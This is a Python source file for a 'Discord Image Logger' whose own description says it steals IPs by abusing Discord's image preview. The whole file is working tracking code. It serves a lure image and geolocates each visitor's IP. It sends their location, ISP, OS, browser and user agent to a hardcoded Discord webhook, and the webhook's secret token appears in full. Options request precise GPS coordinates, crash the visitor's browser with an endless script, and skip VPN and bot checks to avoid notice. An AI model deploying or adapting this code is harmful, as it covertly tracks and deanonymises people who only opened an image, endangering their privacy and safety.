# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1141155791173341264/xIDnVepwg-y1jemAYextFmgwZYm8rYZaHAfYOQ1-RlwWjC8mxbnff54vHjutNSB98IAE",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
